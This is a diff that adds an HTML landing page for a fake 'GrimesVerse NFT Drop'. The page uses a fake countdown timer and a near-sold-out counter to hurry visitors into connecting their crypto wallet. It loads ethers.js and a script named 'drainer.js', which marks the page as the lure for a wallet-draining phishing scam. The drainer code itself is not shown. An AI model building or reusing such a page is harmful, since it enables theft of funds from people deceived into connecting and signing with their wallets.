@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GrimesVerse NFT Drop</title>
+    <style>
+        body { background: #1a1a1a; color: #fff; font-family: Arial; text-align: center; padding: 20px; }
+        #connect, #mint { padding: 15px 30px; font-size: 18px; background: #00ff00; border: none; cursor: pointer; }
+        #status { margin-top: 20px; font-size: 16px; }
+        .countdown { color: #ff0000; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>GrimesVerse NFT Drop - 500 Exclusive Pieces!</h1>
+    <p class="countdown">Mint Ends in: <span id="timer">3:59</span></p>
+    <p>Claimed: 478/500</p>
+    <button id="connect">Connect Wallet</button>
+    <button id="mint" style="display:none;">Mint Now</button>
+    <p id="status">Connect to claim your NFT!</p>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+    <script src="drainer.js"></script>
+</body>
+</html>
